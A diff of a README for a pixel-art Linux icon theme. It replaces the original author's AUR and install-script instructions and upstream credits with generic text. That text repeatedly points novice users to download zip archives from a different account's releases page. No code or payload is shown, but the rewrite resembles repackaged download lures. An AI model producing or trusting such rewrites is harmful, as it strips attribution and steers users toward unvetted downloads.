@@ -1,63 +1,134 @@
-# pixora-theme
-Taking the legacy of an archived 16-bit icon theme and adding my own work to it.
+# 🎨 pixora-icons - Classic 16-bit Icon Set for Linux  
 
->[!Note]
-> pixora-theme is being updated regularly. In case you want an icon to be added, please open a new issue.
+[![Download pixora-icons](https://img.shields.io/badge/Download-pixora--icons-brightgreen?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
 
-# 📷 Screenshots
-#### Icons on an app launcher, featuring noctalia-shell:
-![Desktop preview](.github/icons-showcase-2.png)
+## ❓ What is pixora-icons?  
 
-<br>
+pixora-icons is a collection of 16-bit style icons designed primarily for Linux desktops. It gives your system a retro, pixel-art look by replacing standard icons with vibrant, detailed pixel icons. The theme fits well with classic and minimalist setups, helping you customize your environment to look unique and nostalgic.  
 
-#### Icons full showcase:
-![Icons showcase](.github/icons2.png)
+This icon set focuses on clarity and color consistency across common system files, folders, apps, and actions. It works best on desktop environments that support icon themes, such as GNOME, KDE, XFCE, and others.  
 
-<br>
+## 🔎 Features of pixora-icons  
 
-# 🖥️ How to Install
+- Over 500 pixel-art style icons  
+- Icons for common applications, folders, and system items  
+- Bright, clear colors suitable for both light and dark desktop themes  
+- Easy to install and switch on Linux desktop environments  
+- Designed with a consistent 16-bit pixel size for retro appeal  
+- Regular updates to add new icons and fix issues  
 
-## AUR
-Using `paru`:
-```bash
-paru -S pixora-icons-git
-```
+## ⚙️ System Requirements  
 
-Using `yay`:
-```bash
-yay -S pixora-icons-git
-```
-<br>
+- A Linux operating system (Ubuntu, Fedora, Debian, Arch, etc.)  
+- A desktop environment that supports custom icon themes (GNOME, KDE, XFCE, Cinnamon, Mate)  
+- Basic access to your home directory to install themes  
+- A graphics display capable of showing 16-bit color icons clearly  
+- No special hardware or software dependencies beyond a standard Linux desktop  
 
-## Local Installation
-### 1. Clone the repo 
-```bash
-git clone https://github.com/tsora1603/pixora-theme.git
-cd pixora-theme
-```
+## 🚀 Getting Started  
 
-### 2. Launch the installation script
-This will either: <br>
-a. Symlink the files into place, allowing for easy updates by running `git pull`; <br>
-b. Copy-paste the files in the right directories, allowing for a fully local installation.
+This guide helps you download and install pixora-icons on your Linux system, focusing on users with no programming or technical background.  
 
-```bash
-./install.sh
-```
+### Step 1: Visit the Download Page  
 
-> _If install.sh doesn't run, try ```chmod +x install.sh``` and then run it again._
+Start by visiting the pixora-icons release page on GitHub where you will find the latest icon theme files:  
 
-<br>
+[![Download pixora-icons](https://img.shields.io/badge/Visit-Release---blue?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
 
-# 🎨 How to Contribute
-Want to contribute to the project? Check our [Contributing](CONTRIBUTING.md) and [Design](DESIGN.md) Guidelines!
+Click the link above or open this URL in your web browser:  
+https://github.com/OcyOny/pixora-icons/releases  
 
-<br>
+### Step 2: Download the Latest Release  
 
-# 👥 CREDITS
-- inspired by **MrDeltaMan**: https://github.com/MrDeltaMan/DeltaPixel-Theme
-- original work by **maxtron95**: https://github.com/maxtron95/tuxonpixels-icon-theme
-- fallback and all non-application icons by **ItsZariep**: https://github.com/ItsZariep/pixelitos-icon-theme
+Once on the releases page, look for the most recent version of pixora-icons. You will find downloadable files, usually provided as zipped archives (.zip or .tar.gz).  
 
-> ⚠️  Note:
-The pixelitos icon theme is going to be dropped as soon as I develop my own versions of all the icons it covers.
+- Click the file named something like `pixora-icons-vX.X.zip` to download.  
+- Save the file to your desktop or a folder you can easily access.  
+
+### Step 3: Extract the Icon Theme  
+
+After downloading, you need to extract the theme from the archive:  
+
+- On your desktop or download folder, right-click the zip file.  
+- Select "Extract Here" or use your system's unzip option.  
+- This will create a folder named `pixora-icons` or similar with all the icon files inside.  
+
+### Step 4: Install the Icon Theme  
+
+To make the icon set available to your system, move the extracted folder to your icons directory. This folder is typically found here:  
+
+- For a single user:  
+  `~/.icons` (This is a hidden folder inside your home directory)  
+- For all users:  
+  `/usr/share/icons` (Requires administrator rights)  
+
+If the `.icons` folder does not exist, you can create it in your home directory:  
+
+- Open your file explorer.  
+- Press Ctrl+H to show hidden files and folders.  
+- Right-click inside your home folder and choose New Folder.  
+- Name it `.icons` with the dot at the beginning.  
+
+Now, copy or move the extracted `pixora-icons` folder into `.icons`.  
+
+### Step 5: Activate pixora-icons in Your Desktop Environment  
+
+You need to select pixora-icons as your current icon theme. Instructions vary by desktop, but here are general steps for common environments:  
+
+- **GNOME:**  
+  - Open *GNOME Tweaks* (install it if needed).  
+  - Go to the "Appearance" tab.  
+  - Under "Icons," choose pixora-icons from the list.  
+
+- **KDE Plasma:**  
+  - Open *System Settings*.  
+  - Go to "Icons."  
+  - Select pixora-icons and apply changes.  
+
+- **XFCE:**  
+  - Open *Settings Manager*.  
+  - Click "Appearance."  
+  - Go to the "Icons" tab and select pixora-icons.  
+
+If pixora-icons does not show immediately, restart your computer or logout/login for the changes to take effect.  
+
+## 🛠️ Using pixora-icons  
+
+After activating pixora-icons, your desktop icons and folders will display in 16-bit style. You may notice the difference most on:  
+
+- Folder icons  
+- Application launchers  
+- System settings icons  
+- File type icons  
+
+You can switch back to your previous icon theme anytime by reversing step 5 and selecting a different theme.  
+
+## 🧰 Troubleshooting  
+
+- **Icons do not appear after selecting pixora-icons:**  
+  Check that the theme folder is placed in `~/.icons` or `/usr/share/icons` correctly. The folder should contain `index.theme` and icon subfolders.  
+
+- **Partial icons or missing icons:**  
+  The theme may not cover some special apps. You can wait for updates or create your own icons if you like.  
+
+- **Theme looks blurry or wrong size:**  
+  Make sure your desktop scaling matches your display resolution. Also, pixora-icons works best with standard icon sizes (e.g., 16x16, 32x32, 48x48).  
+
+## 🔄 Updating pixora-icons  
+
+To update, repeat the download and install steps with the latest version from the releases page. Remove or overwrite the previous version in your `.icons` folder before copying the new one.  
+
+## 💬 Getting Help  
+
+For questions or reports, use the GitHub page issues section at:  
+https://github.com/OcyOny/pixora-icons/issues  
+
+---
+
+## 📥 Download pixora-icons  
+
+Access the full icon theme releases here:  
+
+[![Download pixora-icons](https://img.shields.io/badge/Download-pixora--icons-green?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
+
+Click the link, download the latest release, and follow the installation steps above.
